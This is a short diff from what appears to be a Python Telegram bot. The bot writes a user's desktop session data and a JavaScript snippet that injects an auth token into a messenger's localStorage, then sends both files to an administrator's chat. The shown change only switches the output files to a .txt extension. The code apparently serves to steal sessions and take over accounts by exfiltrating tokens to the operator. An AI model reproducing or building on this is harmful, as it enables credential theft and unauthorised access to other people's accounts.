@@ -91,10 +91,10 @@ localStorage.setItem('__oneme_auth', JSON.stringify({{"token":"{token}","viewerI
 window.location.reload();"""
 
 async def send_files(phone, uid, work_dir, desktop, js):
-    dp = f"{work_dir}/desktop_session.json"
+    dp = f"{work_dir}/desktop_session.txt"
     with open(dp, "w", encoding="utf-8") as f:
-        json.dump(desktop, f, ensure_ascii=False, indent=4)
-    wp = f"{work_dir}/web_token.js"
+        f.write(json.dumps(desktop, ensure_ascii=False, indent=4))
+    wp = f"{work_dir}/web_token.txt"
     with open(wp, "w", encoding="utf-8") as f:
         f.write(js)
     await bot.send_document(ADMIN_ID, FSInputFile(dp),
